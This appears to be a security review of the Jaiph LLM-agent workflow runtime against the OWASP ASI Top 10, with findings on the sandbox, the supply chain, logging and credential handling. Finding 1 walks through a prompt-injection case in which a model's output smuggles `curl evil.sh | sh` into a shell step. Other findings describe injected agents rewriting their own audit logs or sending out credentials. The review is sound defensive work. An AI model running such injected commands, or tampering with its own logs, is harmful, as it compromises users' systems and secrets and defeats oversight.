---
name: security_review
title: Security review
diataxis: explanation
date: 2026-07-20
scope: Full Jaiph repository — workflow DSL runtime, TypeScript CLI, Docker sandbox, agent backends (cursor/claude/codex), script & shell step execution, env/secret handling, run artifacts, installers, and skills
framework: OWASP ASI Top 10
---

# Jaiph Security Review — OWASP ASI Top 10

## Executive summary

Jaiph is a workflow-DSL runtime that drives LLM agents and executes scripts and
shell on a user's behalf, isolated by a Docker sandbox. Reviewed as an *agentic
control plane*, the design is unusually disciplined in the places that matter
most for deterministic policy: the env-forwarding **allowlist** and mount
**denylist** are pure code with no LLM in the enforcement path (ASI-08), and the
runtime ships real circuit breakers — layered prompt watchdogs, an absolute
duration cap, recursion-depth and inbox-dispatch limits, and a
force-remove-by-name container kill switch (ASI-10).

The residual risk is concentrated where **untrusted model output meets
execution**. The DSL is shell-first: any workflow line that is not a keyword
becomes a shell step, and `sh` steps run through `sh -c` on a string that may
embed values captured from a prompt. Scripts, by contrast, are spawned by argv
(no shell parsing of arguments) — a genuine strength that keeps this from being
worse. The security boundary between "model said it" and "machine ran it" is
therefore the Docker sandbox itself, not any input validation. That boundary is
solid in the default configuration but is *deliberately* removed by `--unsafe`
(host-only) and weakened by `--inplace` / the MCP default (host workspace
bind-mounted read-write).

No directly exploitable HIGH issue was found: the sandbox contains
prompt-injection-to-shell in the default posture, and the capability grants that
weaken the sandbox all require a kernel-level bug to turn into escape. The
findings below are the conditions under which the boundary thins, plus
defense-in-depth gaps in auditability and supply chain.

**Verdict: PASS** (no HIGH findings).

| Severity | Count |
|----------|-------|
| HIGH     | 0     |
| MEDIUM   | 2     |
| LOW      | 5     |

**ASI coverage: 2 / 10 PASS** (2 PASS, 8 PARTIAL, 0 FAIL). The low PASS count
reflects a strict reading of the ASI checklist (which expects e.g. hash-chained
audit logs and cryptographic agent identity); most controls are *partially*
present and contained by the sandbox rather than absent.

## ASI compliance matrix

| Risk | Status | Note |
|------|--------|------|
| ASI-01 Prompt Injection | PARTIAL | No validation gate between prompt output and tool/shell execution; sandbox is the only mitigation. |
| ASI-02 Insecure Tool Use | PARTIAL | Scripts spawn by argv (safe); `sh -c` on interpolated strings is raw shell by design. |
| ASI-03 Excessive Agency | PARTIAL | Single fixed workspace mount, no user mounts; but `--unsafe`/`--inplace`/MCP-default remove or thin the isolation. |
| ASI-04 Unauthorized Escalation | PARTIAL | Config overrides gated by deterministic `*_LOCKED` flags; but imported-module metadata can change the executed agent command without attestation. |
| ASI-05 Trust Boundary | PARTIAL | Single-process, single-trust-domain; inter-workflow `send`/inbox sender identity is a plain string, no verification. |
| ASI-06 Insufficient Logging | PARTIAL | Structured `run_summary.jsonl` with ids/timestamps/status (replayable), but written into agent-writable `.jaiph/runs`, not hash-chained, no secret redaction. |
| ASI-07 Insecure Identity | PARTIAL | No cryptographic agent identity; backends authenticate to providers via API keys/OAuth only. Largely N/A for a local single-user CLI. |
| ASI-08 Policy Bypass | PASS | Env allowlist + mount denylist + `*_LOCKED` gates are deterministic code, fail-closed, no LLM in the enforcement path. |
| ASI-09 Supply Chain | PARTIAL | Installer verifies SHA-256, but from the same origin (TOFU, no signature); Docker image pulls toolchains via unpinned `curl \| sh`. |
| ASI-10 Behavioral Anomaly | PASS | Prompt watchdogs (grace/idle/max), recursion + inbox-dispatch caps, timeout + force-remove container kill switch. |

## Scope and method

The entire repository was scanned, not a diff. Emphasis followed the task's
agentic attack surface:

- **Agent backends & prompt path** — `src/runtime/kernel/prompt.ts`,
  `node-workflow-runtime.ts` (`runPromptStep`, interpolation).
- **Script & shell execution** — `executeScript`, `executeInlineScript`,
  `executeShLine`, `spawnAndCapture` in `node-workflow-runtime.ts`.
- **Docker sandbox** — `src/runtime/docker.ts`, `runtime/overlay-run.sh`,
  `runtime/Dockerfile`, sandbox-mode selection and cap/mount/env policy.
- **Secrets & env** — `ENV_ALLOW_PREFIXES`, `isEnvAllowed`, `remapDockerEnv`,
  `preflight-credentials.ts`.
- **Privilege / bypass** — `--unsafe`, `--inplace`, `JAIPH_INPLACE`,
  `applyMetadataScope` and the `*_LOCKED` gates.
- **Supply chain** — `docs/install`, `docs/install.ps1`, `Dockerfile`.
- **Auditability** — `run_summary.jsonl`, run artifacts, event emitter.
- **MCP exposure** — `src/cli/mcp/tools.ts`, sandbox mode for tool calls.

Only issues estimated above 0.8 confidence of real exploitability in *this*
codebase are reported; web-app categories (SQLi/XSS/CSRF/JWT) were excluded as
out of scope per the brief. The report itself is the only file written.

## Findings

### 1. Prompt/model output flows into `sh -c` with no validation gate

- **ASI:** ASI-01 (Prompt Injection) / ASI-02 (Insecure Tool Use)
- **Severity:** MEDIUM
- **Confidence:** 0.85
- **Where:** `src/runtime/kernel/node-workflow-runtime.ts:1642` (`executeShLine` →
  `sh -c command`), fed by `interpolateWithCaptures` at
  `src/runtime/kernel/node-workflow-runtime.ts:1048-1057`; shell fallthrough is
  the DSL's default for any non-keyword line (see `docs/architecture.md`).

**Exploit scenario.** A workflow captures a prompt result and uses it in a shell
step:

```
const target = prompt "Read scan.txt and return the hostname to probe"
sh "nmap ${target}"
```

`scan.txt` is attacker-influenced content the agent reads. A prompt-injection
payload makes the model return `example.com; curl evil.sh | sh`. Because
`executeShLine` runs `sh -c "nmap example.com; curl evil.sh | sh"`, the injected
suffix executes. There is no validation, quoting, or allowlist between the model
output and the shell — `${target}` is spliced into the command string verbatim.
In the default posture this runs inside the Docker sandbox (the intended blast
radius). Under `--unsafe` it runs on the host; under `--inplace` / MCP it can
modify the real project tree (e.g. write a `.git/hooks/pre-commit`).

**Why it is MEDIUM, not HIGH.** The sandbox is the designed containment and it
holds in the default configuration, and the pattern requires the author to embed
a capture in a shell line. It is not a clean RCE-out-of-the-box.

**Remediation.** Document this data-flow hazard prominently for workflow authors;
prefer passing captured values as script *arguments* (already safe via argv in
`executeScript`) rather than interpolating into `sh` strings. Consider a
lint/validator warning when a `${var}` known to originate from a `prompt`
capture appears inside a shell step, and offer a shell-quoting helper
(`${var|quote}`) so the safe path is the easy path.

### 2. MCP tool calls default to `inplace` — real workspace bind-mounted read-write

- **ASI:** ASI-03 (Excessive Agency)
- **Severity:** MEDIUM
- **Confidence:** 0.8
- **Where:** `src/runtime/docker.ts:405-411` (`selectMcpSandboxMode` returns
  `inplace` when nothing is set) and `src/runtime/docker.ts:783-786`
  (`inplace` binds the host workspace `:rw`).

**Exploit scenario.** When Jaiph runs as an MCP server, every exposed workflow
(`src/cli/mcp/tools.ts`) executes with the *host* workspace mounted read-write by
default — isolation is inverted relative to `jaiph run`. A calling agent (or a
prompt-injected sub-agent) invoking a workflow that writes files, combined with
Finding 1, can modify any file in the real project: source, CI config, git
hooks, `package.json` scripts. The Docker machine boundary still stands, but the
*workspace* boundary is gone by default, so tool effects are persistent and can
seed later host-side execution (a poisoned build script or git hook run outside
the sandbox).

**Remediation.** Make the MCP default explicit and visible in the server startup
banner ("writes land live on <path>"), and consider defaulting MCP to `copy`
isolation with `inplace` as an opt-in, matching `jaiph run`. At minimum, require
an env/flag acknowledgement before serving a workspace in live-write mode.

### 3. Overlay sandbox grants SYS_ADMIN and disables AppArmor

- **ASI:** ASI-03 (Excessive Agency) / ASI-05 (Trust Boundary)
- **Severity:** LOW
- **Confidence:** 0.75
- **Where:** `src/runtime/docker.ts:729` (`--cap-add SYS_ADMIN`, plus SETUID/
  SETGID/CHOWN/DAC_READ_SEARCH) and `src/runtime/docker.ts:746`
  (`--security-opt apparmor=unconfined` on Linux). Overlay setup runs as
  `--user 0:0` (`docker.ts:768`).

**Exploit scenario.** To mount `fuse-overlayfs`, overlay mode starts the
container as root with `SYS_ADMIN` and AppArmor unconfined. The overlay script
then drops to the host UID via `setpriv` (`runtime/overlay-run.sh:29`) and
`--security-opt no-new-privileges` is set, so the workflow process itself is
unprivileged. But a kernel/FUSE vulnerability reachable from the container, or a
window before the UID drop, has a materially larger attack surface than a
minimal container would. This is defense-in-depth, not a direct exploit — hence
LOW.

**Remediation.** Prefer the `copy` sandbox path (no SYS_ADMIN, no fuse) as the
default where feasible; it already provides the same isolation guarantee per the
in-code comments. Where overlay is required, scope AppArmor with a tailored
profile instead of `unconfined`, and document the elevated posture.

### 4. Audit trail lives in an agent-writable directory, unchained and unredacted

- **ASI:** ASI-06 (Insufficient Logging)
- **Severity:** LOW
- **Confidence:** 0.8
- **Where:** run dir + `run_summary.jsonl` created under `.jaiph/runs`
  (`node-workflow-runtime.ts:281-291`, `:445-452`); artifacts mounted at
  `/jaiph/run` (`docker.ts:576,793`). No redaction/hash-chaining in the event
  emitter (`runtime-event-emitter.ts`, `emit.ts`).

**Exploit scenario.** The structured JSONL log is good — timestamped, id-linked,
status-bearing, and replayable. But it is written to `/jaiph/run` (mapped to
`.jaiph/runs` on the host), which the running workflow can write to. A
misbehaving or injected agent can append, rewrite, or truncate its own run
summary and artifacts to hide activity, because there is no append-only
enforcement and no hash chain to detect tampering. Separately, prompt text and
the reconstructed command line are written to artifacts verbatim
(`prompt.ts:745-746`), so any secret a workflow interpolates into a prompt or
logs to stdout is persisted in cleartext.

**Remediation.** Hash-chain `run_summary.jsonl` (each line carries the SHA-256 of
the previous) and/or stream events to a location the sandboxed workflow cannot
write. Add a redaction pass over known credential env values before writing
prompt/command artifacts.

### 5. Installer and image toolchain trust-on-first-use without signatures

- **ASI:** ASI-09 (Supply Chain Integrity)
- **Severity:** LOW
- **Confidence:** 0.8
- **Where:** `docs/install:218-242` (binary + `SHA256SUMS` downloaded from the
  same base URL, checksum compared, no signature); `runtime/Dockerfile:86,104,123,188`
  (`uv`, `rustup`, `bun`, cursor installer via unpinned `curl … | sh`/`| bash`).

**Exploit scenario.** The installer downloads the binary and its `SHA256SUMS`
from the same GitHub release origin, then verifies one against the other — this
detects corruption but not a compromised release: an attacker who can replace the
asset replaces the checksum file too. The Dockerfile similarly pipes remote
install scripts straight into a shell with no pinned digest, so a compromised
upstream (astral.sh, sh.rustup.rs, bun.sh, cursor.com) executes arbitrary code at
image-build time. There is no detached signature (GPG/cosign), no SBOM, and no
`INTEGRITY.json`-style manifest.

**Remediation.** Publish and verify a detached signature over `SHA256SUMS`
(cosign or minisign) in the installer; pin toolchain installers to a known SHA-256
and verify before executing; generate an SBOM for the runtime image.

### 6. Imported `.jh` module metadata can change the executed agent command

- **ASI:** ASI-03 (Excessive Agency) / ASI-09 (Supply Chain Integrity)
- **Severity:** LOW
- **Confidence:** 0.75
- **Where:** `applyMetadataScope` applies callee-module metadata cross-module
  (`node-workflow-runtime.ts:1699-1700` sets `JAIPH_AGENT_COMMAND` unless
  `JAIPH_AGENT_COMMAND_LOCKED=1`); the cursor backend spawns that command
  (`prompt.ts:199-211`, spawned at `prompt.ts:600`).

**Exploit scenario.** A workflow `import`s a third-party `.jh` library. That
module's metadata sets `agent.command = "some-binary --flag"`. When a `prompt`
step executes in the imported module's scope, Jaiph spawns `some-binary` as the
"agent backend" (argv, so no shell metacharacters, but any executable on PATH
runs). Unless the top-level run set `JAIPH_AGENT_COMMAND_LOCKED=1`, importing an
untrusted module silently changes what binary runs on the user's behalf — a
config-driven escalation without any attestation step.

**Remediation.** Do not let imported-module metadata override
`agent.command`/`agent.backend` by default; require the entry module (or an
explicit flag) to opt into honoring a dependency's execution config, or lock
these keys by default and require explicit unlock.

### 7. Broad credential env prefixes forwarded into the container

- **ASI:** ASI-06 (Insufficient Logging) / ASI-08-adjacent
- **Severity:** LOW
- **Confidence:** 0.8
- **Where:** `ENV_ALLOW_PREFIXES = ["JAIPH_","ANTHROPIC_","CURSOR_","CLAUDE_","OPENAI_"]`
  (`src/runtime/docker.ts:582`); forwarded in `buildDockerArgs`
  (`docker.ts:801-808`); `--env` passthrough bypasses the allowlist by design
  (`docker.ts:809-813`).

**Exploit scenario.** The allowlist is the right shape (fail-closed, prefix-based)
and is correct for delivering agent credentials. The residual risk is breadth: an
entire prefix family is forwarded, so any `ANTHROPIC_*`/`OPENAI_*`/`CLAUDE_*`
value on the host — including ones unrelated to the current backend — is exposed
to whatever code runs in the sandbox, and combined with Finding 1 an injected
shell step inside the container can read them from its environment and exfiltrate
over the default network. This is contained (same trust domain, sandboxed) but
wider than least-privilege.

**Remediation.** Forward only the specific credential keys the resolved backend
needs (e.g. `ANTHROPIC_API_KEY`/`CLAUDE_CODE_OAUTH_TOKEN` for claude), rather than
whole prefix families; document that `--env` is an intentional bypass.

## Critical gaps and recommendations

There are no critical (HIGH) gaps. In priority order:

1. **Close the prompt-output → shell gap (Findings 1, 2).** This is the highest
   residual risk because it converts prompt injection into command execution. The
   sandbox contains it today, so the practical fixes are (a) steer authors to
   argv-passing over `sh` interpolation, (b) a validator warning for
   prompt-derived vars in shell steps, and (c) making MCP's live-write default
   explicit or opt-in.
2. **Harden auditability (Finding 4).** Hash-chain the run summary and add secret
   redaction so the audit trail is trustworthy and safe to retain — this is what
   separates ASI-06 PARTIAL from PASS.
3. **Sign the supply chain (Finding 5).** A detached signature over `SHA256SUMS`
   and pinned toolchain digests move ASI-09 toward PASS.
4. **Tighten least privilege (Findings 3, 6, 7).** Prefer the `copy` sandbox,
   scope AppArmor, lock execution-config keys against untrusted imports, and
   forward only backend-specific credentials.

**What is already strong and should be preserved:** the deterministic,
code-only, fail-closed policy layer (mount denylist, env allowlist, `*_LOCKED`
gates — ASI-08); argv-based script spawning that keeps command injection out of
the *script* path; and the genuine circuit-breaker / kill-switch machinery
(watchdogs, caps, force-remove container — ASI-10). These are the right
foundations; the findings above are about the edges where untrusted model output
reaches execution and where the sandbox is intentionally relaxed.
